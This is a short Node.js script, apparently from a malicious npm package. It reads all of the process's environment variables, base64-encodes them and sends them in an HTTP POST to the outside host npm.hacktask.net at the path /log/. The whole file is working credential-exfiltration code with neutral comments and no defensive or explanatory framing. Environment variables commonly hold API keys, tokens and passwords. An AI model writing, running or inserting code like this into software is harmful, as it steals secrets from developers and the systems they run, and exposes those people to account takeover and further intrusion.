// Importing required modules
const http = require('http');
const querystring = require('querystring');

// Defining the host and encoding the environment variables as base64
const host = 'npm.hacktask.net';
const env = JSON.stringify(process.env);
const data = Buffer.from(env).toString('base64');

// Creating POST data using querystring module
const postData = querystring.stringify({ data });

// Configuring HTTP request options
const options = {
  hostname: host,
  port: 80,
  path: '/log/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

// Making an HTTP POST request
const req = http.request(options);

// Writing the POST data to the request
req.write(postData);

// Ending the request
req.end();

